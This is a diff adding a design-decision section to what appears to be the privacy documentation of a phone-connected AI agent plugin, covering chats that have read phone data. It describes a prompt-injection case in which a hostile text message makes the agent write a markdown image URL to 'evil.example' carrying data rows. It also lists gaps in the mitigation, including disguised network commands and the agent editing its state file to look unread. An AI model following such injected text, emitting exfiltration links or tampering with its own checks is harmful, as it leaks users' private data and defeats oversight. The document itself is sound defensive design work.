@@ -41,3 +41,35 @@ the switches and approvals protect the `phone_data` tool, but they don't fully s
 - A shell command might read some of this data directly with `content query`. This has not been tested.
 
 **So:** Say this plainly in the privacy doc. Don't describe the gate as stopping everything the agent can do on the phone.
+
+## Chats that have read phone data
+
+**Decided:** 2026-11-04, delegated by the owner to the coordinator, as the option that keeps convenience and safety.
+
+The problem: a hostile text message can tell the agent to write `![](https://evil.example/x.png?d=<rows>)`. After the user
+allows one read, the page loads the image and the data leaves with no tap. A link or a card's `@OpenUrl` does it with one
+tap, and a command such as `curl` can too.
+
+**So, only in chats that have read phone data, for the rest of that chat, and only for actions that can send data out.** A
+chat has read when a `phone_data` tool call exists in it, whatever its outcome. Every other chat behaves exactly as before.
+
+- **The page, in every access mode including Full access.** Remote images, video and audio in the agent's text don't load:
+  a placeholder shows the host name and "Tap to load", and nothing is requested before the tap. Video cards show no
+  thumbnail. Links, inline-code addresses, file chips, links in an HTML preview and a card's `@OpenUrl` show the full address
+  (site, address, and the query on its own) in an in-app dialog and open only on confirmation. Local files and attachments
+  load as always. The state is derived from the chat's items, so it survives a reload or a resume and covers replies already
+  drawn when the read happens.
+- **The plugin, except in Full access.** The chat is remembered (in memory, and in a small bounded file under
+  `~/.hermes/mobile/`: chat ids only, never data). Its `pre_tool_call` hook then makes Hermes ask the user before terminal
+  commands that match network tools, code that talks to the network, web and browser tools, and message-sending tools. The
+  ask says this chat has read phone data and shows the command; it uses a fresh rule key each time, so no answer carries over.
+  Reading files and other commands run as usual. If the check can't load, those tools are blocked in that chat.
+
+**Limits, stated plainly:**
+
+- The list of network commands is patterns. A disguised command (built from variables, or a script file that makes the call)
+  can slip through. It is a speed bump.
+- In Full access and in Auto access, Hermes's gate approves without asking, so the plugin's ask never shows. Only the
+  page's protection holds there.
+- The agent runs in Termux and can edit the plugin's state file to make a chat look unread.
+- Shizuku routes are unchanged (see above).
